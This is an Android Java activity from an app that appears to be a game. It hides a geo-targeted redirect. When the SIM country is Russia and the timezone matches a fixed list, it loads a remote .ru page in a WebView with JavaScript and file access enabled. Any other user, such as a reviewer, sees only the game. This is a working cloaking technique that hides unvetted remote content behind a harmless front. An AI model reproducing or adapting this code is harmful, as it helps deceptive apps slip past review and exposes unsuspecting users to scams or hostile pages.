package com.kjkksjc.clop;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.icu.util.TimeZone;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.telephony.TelephonyManager;
import android.webkit.WebResourceError;
import android.webkit.WebResourceRequest;
import android.webkit.WebResourceResponse;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import java.util.Date;

public class Start extends AppCompatActivity {
    private WebView webView;
    private String URL = "https://sjnjkakkkdj";
    private String URL_OPEN = "http://coolzzajs.ru/nvdzwG";

    @SuppressLint("SetJavaScriptEnabled")
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.start);
        if (getCountry() && isOnline() && noTime()) {
            this.webView = findViewById(R.id.web_view);
            this.webView.setWebViewClient(new WebViewClient() {
                public boolean shouldOverrideUrlLoading(WebView view, String url) {
                    if (url.contains(URL)) {
                        Start.this.showGame();
                    } else {
                        view.loadUrl(url);
                    }
                    return true;
                }

                public void onReceivedError(WebView view, WebResourceRequest request, WebResourceError error) {
                    super.onReceivedError(view, request, error);
                    Start.this.showGame();
                }

                public void onReceivedHttpError(WebView view, WebResourceRequest request, WebResourceResponse errorResponse) {
                    super.onReceivedHttpError(view, request, errorResponse);
                    Start.this.showGame();
                }
            });
            WebSettings webSettings = this.webView.getSettings();
            webSettings.setBuiltInZoomControls(true);
            webSettings.setSupportZoom(true);
            webSettings.setJavaScriptEnabled(true);
            webSettings.setAllowFileAccess(true);
            this.webView.loadUrl(URL_OPEN);
            return;
        }
        showGame();
    }

    private void showGame() {
        startActivity(new Intent(this, MainActivity.class));
        finish();
    }


    private boolean getCountry() {
        if (getSystemService(Context.TELEPHONY_SERVICE) == null) {
            return false;
        }
        assert ((TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE)) != null;
        String countryCodeValue = ((TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE)).getSimCountryIso();
        if (countryCodeValue == null || (!countryCodeValue.equalsIgnoreCase("ru") && !countryCodeValue.equalsIgnoreCase("rus"))) {
            return false;
        }
        return true;
    }


    public boolean isOnline() {
        if (getSystemService(Context.CONNECTIVITY_SERVICE) == null) {
            return false;
        }
        assert ((ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE)) != null;
        NetworkInfo netInfo = ((ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE)).getActiveNetworkInfo();
        if (netInfo == null || !netInfo.isConnectedOrConnecting()) {
            return false;
        }
        return true;
    }

    private boolean noTime() {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N) {
            TimeZone tz = TimeZone.getDefault();
            Date now = new Date();
            int offsetFromUtc = tz.getOffset(now.getTime()) / 1000 / 3600;
            int[] timezone = {2, 3, 4, 7, 8, 9, 10, 11, 12};
            for (int item : timezone) {
                if (offsetFromUtc == item)
                    return true;
            }
        } else {
            return true;
        }

        return false;
    }
}
